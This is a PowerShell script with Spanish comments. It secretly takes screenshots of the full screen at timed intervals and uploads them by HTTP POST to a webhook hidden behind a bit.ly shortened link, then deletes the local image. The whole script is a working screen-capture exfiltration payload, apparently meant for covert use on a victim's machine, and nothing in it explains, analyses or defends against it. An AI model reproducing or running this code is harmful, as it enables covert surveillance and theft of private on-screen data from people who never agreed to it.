$hookurl = "https://bit.ly/web_chupakbras"
$seconds = 30 # Intervalo de captura de pantalla en segundos
$a = 1 # Cantidad de capturas de pantalla a enviar

# Detectar URL acortada
if ($hookurl.Length -ne 121) {
    Write-Host "URL del Webhook acortada detectada..."
    $hookurl = (Invoke-RestMethod -Uri $hookurl).url
}

while ($a -gt 0) {
    $Filett = "$env:temp\SC.png"
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
    Start-Sleep 1
    
    try {
        Write-Host "Enviando imagen..."
        Invoke-RestMethod -Uri $hookurl -Method Post -InFile $Filett
        Remove-Item -Path $Filett -ErrorAction SilentlyContinue
    } catch {
        Write-Host "Error al enviar la imagen al webhook: $_"
    }
    
    Start-Sleep $seconds
    $a--
}